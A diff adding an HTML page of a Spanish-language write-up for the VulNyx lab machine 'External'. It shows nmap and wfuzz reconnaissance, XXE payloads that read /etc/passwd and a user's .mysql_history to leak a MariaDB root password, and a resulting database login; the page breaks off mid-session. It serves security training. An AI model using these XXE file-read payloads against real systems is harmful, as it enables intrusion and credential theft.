@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">VulNyx - External | noname</title>
+<meta property="og:title" content="VulNyx - External | noname" />
+<meta name="twitter:title" content="VulNyx - External | noname" />
+<meta itemprop="name" content="VulNyx - External | noname" />
+<meta name="application-name" content="VulNyx - External | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup External 🟢">
+<meta itemprop="description" content="Writeup External 🟢" />
+<meta property="og:description" content="Writeup External 🟢" />
+<meta name="twitter:description" content="Writeup External 🟢" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/external/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta property="og:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.webp" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-06-20T13:06:22&#43;0200 />
+    <meta property="article:published_time" content=2023-06-20T13:06:22&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "VulNyx - External",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-06-20",
+        "description": "Writeup External 🟢",
+        "wordCount":  797 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-06-20",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/images\/logo.webp"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/external/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">VulNyx - External</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-06-20T13:06:22&#43;02:00" itemprop="datePublished"> Jun 20, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/nyx/external/external_logo.webp" alt="logo"></p>
+<ul>
+<li><em>XXE File Read</em></li>
+<li><em>Leakage Credentials</em></li>
+<li><em>Abuse Mysql Binary</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos.</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -v -T5 -n 192.168.1.112
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios.</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80,3306 192.168.1.112
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 f0e624fb9eb07a1abdf7b185237fb16f (RSA)
+</span></span><span class="line"><span class="cl">|   256 99c87431451058b0cecc63b47a82573d (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 60da3e3138fab549ab48c3432c9fd132 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
+</span></span><span class="line"><span class="cl">|_http-title: 404 Not Found
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: GET POST OPTIONS HEAD
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Debian)
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   MySQL 5.5.5-10.5.19-MariaDB-0+deb11u2
+</span></span><span class="line"><span class="cl">| mysql-info: 
+</span></span><span class="line"><span class="cl">|   Protocol: 10
+</span></span><span class="line"><span class="cl">|   Version: 5.5.5-10.5.19-MariaDB-0+deb11u2
+</span></span><span class="line"><span class="cl">|   Thread ID: 9
+</span></span><span class="line"><span class="cl">|   Capabilities flags: 63486
+</span></span><span class="line"><span class="cl">|   Some Capabilities: IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, InteractiveClient, LongColumnFlag, SupportsCompression, SupportsLoadDataLocal, FoundRows, ODBCClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+</span></span><span class="line"><span class="cl">|   Status: Autocommit
+</span></span><span class="line"><span class="cl">|   Salt: )t-#cM9sW;aUh-CJ(+&lt;,
+</span></span><span class="line"><span class="cl">|_  Auth Plugin Name: mysql_native_password
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="puerto-80">Puerto 80</h3>
+<p><img src="/../machines/nyx/external/http.webp" alt="http"></p>
+<p>En el código fuente encuentro el dominio <strong>ext.nyx</strong>.</p>
+<p><img src="/../machines/nyx/external/domain.webp" alt="domain"></p>
+<p>Hago una búsqueda de subdominios y encuentro <strong>administrator</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -t 200 -c --hw=24 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#34;Host: FUZZ.ext.nyx&#34; http://ext.nyx
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://ext.nyx/
+</span></span><span class="line"><span class="cl">Total requests: 114441
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                          
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000007602:   200        25 L     56 W       1089 Ch     &#34;administrator&#34;
+</span></span></code></pre></div><p>Me voy al nuevo subdominio y veo un formulario de registro.</p>
+<p><img src="/../machines/nyx/external/administrator-ext-nyx.webp" alt="administrator-ext-nyx"></p>
+<p>Si intento registrarme con mi nick me dice que el usuario ya existe.</p>
+<p><img src="/../machines/nyx/external/registro.webp" alt="registro"></p>
+<p>Capturo la petición con <strong>Burpsuite</strong> y veo que los datos están publicados en formato <strong>xml</strong>.</p>
+<p><img src="/../machines/nyx/external/burpSuite.webp" alt="burpSuite"></p>
+<p>Detecto la vulnerabilidad usando este  recurso<a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity"> What are XML custom entities</a>. Para ello he creado un archivo con el nombre <strong>vuln</strong> y le he añadido el siguiente código:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;!</span><span class="n">ENTITY</span><span class="w"> </span><span class="n">myentity</span><span class="w"> </span><span class="s2">&#34;XXE VULNERABLE!&#34;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">details</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">email</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&amp;</span><span class="n">myentity</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">email</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="mi">1234</span><span class="o">&lt;/</span><span class="n">password</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">details</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></div><p>Mando la petición con curl y veo que es vulnerable a <strong>XXE</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -X POST &#34;http://administrator.ext.nyx/form.php&#34; --upload-file &#34;vuln&#34;
+</span></span><span class="line"><span class="cl">&lt;p align=&#39;center&#39;&gt; &lt;font color=white size=&#39;5pt&#39;&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">XXE VULNERABLE!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> is already registered! &lt;/font&gt; &lt;/p&gt;
+</span></span></code></pre></div><p>Modifico el archivo <strong>vuln</strong> para que pueda leer el archivo <strong>passwd</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;!</span><span class="n">ENTITY</span><span class="w"> </span><span class="n">xxe</span><span class="w"> </span><span class="n">SYSTEM</span><span class="w"> </span><span class="s2">&#34;file:///etc/passwd&#34;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">details</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">email</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&amp;</span><span class="n">xxe</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">email</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="mi">1234</span><span class="o">&lt;/</span><span class="n">password</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">details</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></div><p>Lanzo curl de nuevo, me muestra el archivo passwd y enumero el usuario <strong>admin</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -X POST &#34;http://administrator.ext.nyx/form.php&#34; --upload-file &#34;vuln&#34;
+</span></span><span class="line"><span class="cl">&lt;p align=&#39;center&#39;&gt; &lt;font color=white size=&#39;5pt&#39;&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">admin:x:1000:1000:admin,,,:/home/admin:/bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> is already registered! &lt;/font&gt; &lt;/p&gt;
+</span></span></code></pre></div><p>Finalmente modifico de nuevo el archivo <strong>vuln</strong> para que lea el archivo <code>.mysql_history</code> del usuario <strong>admin</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;!</span><span class="n">ENTITY</span><span class="w"> </span><span class="n">xxe</span><span class="w"> </span><span class="n">SYSTEM</span><span class="w"> </span><span class="s2">&#34;file:///home/admin/.mysql_history&#34;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">details</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">email</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&amp;</span><span class="n">xxe</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">email</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="mi">1234</span><span class="o">&lt;/</span><span class="n">password</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">details</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></div><p>Lanzo curl y obtengo las credenciales de acceso al servidor mysql.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -X POST &#34;http://administrator.ext.nyx/form.php&#34; --upload-file &#34;vuln&#34;
+</span></span><span class="line"><span class="cl">&lt;p align=&#39;center&#39;&gt; &lt;font color=white size=&#39;5pt&#39;&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;r*******DB&#39;;
+</span></span><span class="line"><span class="cl">exit;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> is already registered! &lt;/font&gt; &lt;/p&gt;
+</span></span></code></pre></div><p>Me conecto al servidor mysql.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">❯</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">112</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Enter</span><span class="w"> </span><span class="n">password</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">MariaDB</span><span class="w"> </span><span class="n">monitor</span><span class="p">.</span><span class="w">  </span><span class="n">Commands</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="err">\</span><span class="n">g</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Your</span><span class="w"> </span><span class="n">MariaDB</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="mi">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Server</span><span class="w"> </span><span class="n">version</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">19</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">0</span><span class="o">+</span><span class="n">deb11u2</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="mi">11</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2000</span><span class="p">,</span><span class="w"> </span><span class="mi">2018</span><span class="p">,</span><span class="w"> </span><span class="n">Oracle</span><span class="p">,</span><span class="w"> </span><span class="n">MariaDB</span><span class="w"> </span><span class="n">Corporation</span><span class="w"> </span><span class="n">Ab</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">others</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Type</span><span class="w"> </span><span class="s1">&#39;help;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;\h&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">help</span><span class="p">.</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="s1">&#39;\c&#39;</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">clear</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="w">
+</span></span></span></code></pre></div><p>Enumero las bases de datos existentes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[(</span><span class="n">none</span><span class="p">)]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="k">databases</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+--------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Database</span><span class="w">           </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+--------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">admindb</span><span class="w">            </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">information_schema</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">mysql</span><span class="w">              </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">performance_schema</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+--------------------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">4</span><span class="w"> </span><span class="n">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">005</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p>Entro en <strong>admindb</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[(</span><span class="n">none</span><span class="p">)]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">admindb</span><span class="p">;</span><span class="w">
